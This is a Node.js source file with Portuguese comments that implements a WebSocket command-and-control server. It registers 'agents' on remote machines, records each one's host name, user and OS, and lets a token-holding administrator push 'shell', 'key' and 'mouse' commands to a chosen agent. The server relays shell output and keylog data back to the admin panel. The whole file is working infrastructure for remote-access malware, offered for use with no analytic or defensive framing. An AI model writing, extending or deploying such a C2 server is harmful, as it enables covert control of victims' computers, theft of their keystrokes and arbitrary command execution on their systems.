const WebSocket = require('ws');
const { v4: uuidv4 } = require('uuid');

// Configurações
const PORT = 5000;
const ADMIN_TOKEN = "SUA_CHAVE_MESTRA"; // Token para proteger o acesso do seu painel

// Armazenamento em memória (Em produção, use Redis ou MongoDB)
let agents = new Map(); // { agentId: { socket, info } }
let admins = new Set(); // Conjunto de conexões de administradores

const wss = new WebSocket.Server({ port: PORT });

console.log(`[!] Servidor C2 iniciado na porta ${PORT}`);
console.log(`[!] Aguardando conexões de Agentes e Admins...`);

wss.on('connection', (ws, req) => {
    let currentRole = null;
    let currentId = null;

    ws.on('message', async (message) => {
        try {
            const data = JSON.parse(message);

            // --- LÓGICA PARA AGENTES ---
            if (data.type === 'agent_ready') {
                currentRole = 'agent';
                currentId = data.payload.id;
                
                agents.set(currentId, {
                    socket: ws,
                    info: {
                        name: data.payload.name,
                        user: data.payload.user,
                        os: data.payload.os,
                        connectedAt: new Date()
                    }
                });

                console.log(`[+] Agente Conectado: ${data.payload.name} (${data.payload.user})`);
                // Notifica todos os admins que um novo agente está online
                broadcastToAdmins({ type: 'agent_online', agentId: currentId, info: data.payload });
            }

            // --- LÓGICA PARA ADMINISTRADORES (PAINEL WEB) ---
            else if (data.type === 'admin_login') {
                if (data.token === ADMIN_TOKEN) {
                    currentRole = 'admin';
                    admins.add(ws);
                    currentId = 'admin_main';
                    console.log(`[!] Administrador conectado via Painel.`);
                    ws.send(JSON.stringify({ type: 'admin_auth_ok' }));
                } else {
                    ws.send(JSON.stringify({ type: 'error', message: 'Token Inválido' }));
                    ws.close();
                }
            }

            // --- ROTEAMENTO DE COMANDOS (ADMIN -> AGENTE) ---
            else if (currentRole === 'admin' && data.type === 'command_request') {
                const { agentId, command, params } = data;
                const targetAgent = agents.get(agentId);

                if (targetAgent) {
                    // Envia o comando para o agente específico
                    targetAgent.socket.send(JSON.stringify({
                        type: command, // 'shell', 'key', 'mouse'
                        ...params
                    }));
                    console.log(`[>] Comando enviado para Agente ${agentId}: ${command}`);
                } else {
                    ws.send(JSON.stringify({ type: 'error', message: 'Agente offline' }));
                }
            }

            // --- ROTEAMENTO DE RESPOSTAS (AGENTE -> ADMIN) ---
            else if (currentRole === 'agent') {
                // Repassa a resposta do agente (shell_result, keylog, etc) para todos os admins
                broadcastToAdmins({
                    type: data.type,
                    agentId: currentId,
                    payload: data.payload || data
                });
            }

        } catch (err) {
            console.error(`[!] Erro ao processar mensagem: ${err.message}`);
        }
    });

    ws.on('close', () => {
        if (currentRole === 'agent') {
            agents.delete(currentId);
            console.log(`[-] Agente Desconectado: ${currentId}`);
            broadcastToAdmins({ type: 'agent_offline', agentId: currentId });
        } else if (currentRole === 'admin') {
            admins.delete(ws);
            console.log(`[-] Administrador Desconectado.`);
        }
    });
});

// Funções de utilidade
function broadcastToAdmins(msg) {
    const payload = JSON.stringify(msg);
    admins.forEach(adminWs => {
        if (adminWs.readyState === WebSocket.OPEN) {
            adminWs.send(payload);
        }
    });
}

// Prevenção de crash
process.on('uncaughtException', (err) => {
    console.error(`[CRITICAL] ${err.message}`);
});